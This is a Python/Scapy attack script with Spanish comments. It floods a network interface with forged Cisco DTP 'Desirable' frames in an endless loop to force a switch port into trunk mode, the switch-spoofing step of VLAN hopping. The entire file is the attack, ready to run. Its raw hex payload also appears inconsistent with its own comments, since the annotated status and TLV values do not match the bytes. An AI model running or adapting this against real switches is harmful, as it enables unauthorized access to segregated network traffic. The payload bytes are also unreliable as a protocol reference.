from scapy.all import *

# Pon tu interfaz aquí si no es eth0
iface = "eth0"

print(f"[*] Bombardeando {iface} con DTP Desirable para forzar Trunk...")

# Capas de enlace y red para Cisco DTP
dot3 = Dot3(dst="01:00:0c:cc:cc:cc")
llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
snap = SNAP(OUI=0x00000c, code=0x2004)

# Payload en crudo (Hex) para no depender del módulo DTP de Scapy que a veces falla
dtp_payload = (
    b'\x01'                                               # Version: 1
    b'\x01\x01\x00\x00\x00\x00\x00\x00\x00'               # Domain Name (Vacio)
    b'\x00\x0a\x00\x0c\xcc\xcc\xcc\xcc\x00\x00\x00\x00'   # Status: Desirable (0x03)
    b'\x02\x01\x03'                                       # Type
    b'\x03\x01\x05'                                       # Neighbor
    b'\x04\x01\x05'                                       # VTP
)

# Armamos el paquete final
pkt = dot3 / llc / snap / Raw(load=dtp_payload)

# Lo mandamos en bucle cada 2 segundos para que el switch no tumbe el Trunk
sendp(pkt, iface=iface, loop=1, inter=2, verbose=False)
